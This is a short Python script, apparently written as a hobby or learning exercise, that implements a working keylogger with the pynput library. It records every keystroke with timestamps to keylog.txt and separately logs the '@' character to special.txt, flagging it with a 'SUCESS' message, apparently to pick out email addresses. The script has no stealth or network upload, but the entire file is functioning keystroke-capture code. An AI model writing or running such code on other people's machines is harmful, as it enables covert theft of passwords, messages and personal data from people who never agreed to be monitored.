from pynput.keyboard import Key, Listener
import logging
 




def setup_logger(name, log_file, level=logging.INFO):
    """To setup as many loggers as you want"""

    formatter = logging.Formatter(" %(asctime)s - %(message)s")

    handler = logging.FileHandler(log_file)        
    handler.setFormatter(formatter)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger




logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")


speciallogger = setup_logger('specialcharacterlogger', 'special.txt')


def on_press(key):

    print(str(key))
    if(str(key) == "'@'"):
        print("SUCESS")
        speciallogger.info(str(key))

    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()


